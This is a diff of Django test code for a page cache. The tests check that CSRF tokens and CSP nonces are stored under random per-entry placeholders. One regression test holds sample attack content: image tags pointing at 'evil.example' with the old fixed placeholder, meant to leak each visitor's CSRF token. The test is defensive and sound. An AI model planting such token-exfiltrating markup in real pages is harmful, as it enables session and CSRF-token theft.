@@ -333,7 +333,7 @@ def test_placeholder_body_refuses_ambiguous_csrf_token():
         b'<body hx-headers=\'{"X-CSRFToken": "tok1"}\'>'
         b'<div hx-headers=\'{"X-CSRFToken": "tok2"}\'></div></body>'
     )
-    assert page_cache._placeholder_body(request, body) is None
+    assert page_cache._placeholder_body(request, body, page_cache._new_marks()) is None
 
 
 def test_placeholder_body_and_materialize_roundtrip():
@@ -341,18 +341,66 @@ def test_placeholder_body_and_materialize_roundtrip():
     request.csp_nonce = "the-nonce"
     body = b'<script nonce="the-nonce"></script><body hx-headers=\'{"X-CSRFToken": "the-token"}\'>'
 
-    stored = page_cache._placeholder_body(request, body)
+    marks = page_cache._new_marks()
+    stored = page_cache._placeholder_body(request, body, marks)
     assert stored is not None
     assert b"the-nonce" not in stored
     assert b"the-token" not in stored
 
     request.csp_nonce = "fresh-nonce"
-    materialised = page_cache._materialize_body(request, stored)
+    materialised = page_cache._materialize_body(request, stored, marks)
     assert b"fresh-nonce" in materialised
     assert b"the-nonce" not in materialised
     # Token świeży pochodzi z ``get_token(request)`` – to nie jest ten sam string co wcześniej,
     # ale placeholder na pewno zniknął.
-    assert page_cache.CSRF_PLACEHOLDER not in materialised
+    assert marks["csrf"].encode() not in materialised
+
+
+def test_placeholder_planted_in_the_content_never_receives_the_visitors_token():
+    """Pakiet 5, E17: napis-placeholder wpisany w treść strony nie zamienia się w token CSRF gościa.
+
+    Dawny stały placeholder (``@@page-cache-csrf@@``) zostawał w treści i przy odtworzeniu dostawał
+    token **każdego** odwiedzającego – np. w adresie obrazka z cudzego serwera. Znaczniki są teraz
+    losowe per wpis, więc ani stary napis, ani zgadywany przedrostek nie są niczym podmieniane.
+    """
+    request = RequestFactory().get("/")
+    request.csp_nonce = "the-nonce"
+    planted = (
+        b'<img src="https://evil.example/c?t=@@page-cache-csrf@@&n=@@page-cache-nonce@@">'
+        b'<img src="https://evil.example/c?t=@@page-cache-csrf-0000@@">'
+    )
+    body = planted + b'<body hx-headers=\'{"X-CSRFToken": "the-token"}\'>'
+
+    marks = page_cache._new_marks()
+    stored = page_cache._placeholder_body(request, body, marks)
+    request.csp_nonce = "fresh-nonce"
+    materialised = page_cache._materialize_body(request, stored, marks)
+
+    assert materialised.startswith(planted)
+    assert b"fresh-nonce" not in materialised[: len(planted)]
+    assert marks != page_cache._new_marks()
+
+
+def test_entry_without_its_own_marks_is_treated_as_a_miss(client_for, competition, settings):
+    """Wpis w starym formacie (stały placeholder) nie jest serwowany jako trafienie."""
+    from django.core.cache import cache
+
+    _enable(settings)
+    client = client_for(competition)
+    client.get("/")
+    rewritten = 0
+    for raw_key in list(cache._cache):
+        if "web:page_cache:" not in raw_key:
+            continue
+        key = raw_key.split(":", 2)[2]
+        entry = cache.get(key)
+        if isinstance(entry, dict) and "body" in entry:
+            entry.pop("marks", None)
+            cache.set(key, entry, 60)
+            rewritten += 1
+    assert rewritten
+
+    assert client.get("/")["X-Page-Cache"] == "MISS"
 
 
 def test_query_suffix_allows_only_page_parameter():
